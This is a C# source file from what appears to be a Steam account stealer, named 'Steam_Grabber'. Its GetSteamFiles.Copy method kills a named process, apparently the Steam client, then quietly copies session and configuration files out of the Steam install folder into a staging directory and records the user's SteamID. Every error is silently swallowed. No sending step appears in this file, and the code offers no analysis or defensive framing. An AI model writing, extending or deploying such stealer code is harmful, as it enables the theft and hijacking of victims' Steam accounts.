namespace Steam_Grabber
{
    using System;
    using System.Diagnostics;
    using System.IO;

    public class GetSteamFiles
    {
        public static void Copy(string Expansion, string ConfigFiles, string Proc, string Name, string SteamID)
        {
            try
            {
                var SaveConfig = Path.Combine(GetDirPath.Steam, Name);
                var LocalSteamDir = Path.Combine(SteamPath.GetLocationSteam(), Name);

                if (Directory.Exists(SteamPath.GetLocationSteam()))
                {
                    try
                    {
                        foreach (Process process in Process.GetProcessesByName(Proc))
                        {
                            try
                            {
                                process.Kill();
                            }
                            catch { break; }
                            break;
                        }
                    }
                    catch { }
                    if (!Directory.Exists(GetDirPath.Steam))
                    {
                        Directory.CreateDirectory(GetDirPath.Steam);
                        foreach (var file in Directory.GetFiles(SteamPath.GetLocationSteam(), Expansion))
                        {
                            try
                            {
                                File.Copy(file, Path.Combine(GetDirPath.Steam, Path.GetFileName(file)));
                            }
                            catch { }
                        }
                        if (!Directory.Exists(SaveConfig))
                        {
                            Directory.CreateDirectory(SaveConfig);
                            File.AppendAllText(Path.Combine(GetDirPath.Steam, SteamID), SteamProfiles.GetSteamID());
                            foreach (var file2 in Directory.GetFiles(LocalSteamDir, ConfigFiles))
                            {
                                try
                                {
                                    File.Copy(file2, Path.Combine(SaveConfig, Path.GetFileName(file2)));
                                }
                                catch { }
                            }
                        }
                    }
                }
            }
            catch (UnauthorizedAccessException) { }
            catch (IOException) { }
            catch (ArgumentException) { }
        }
    }
}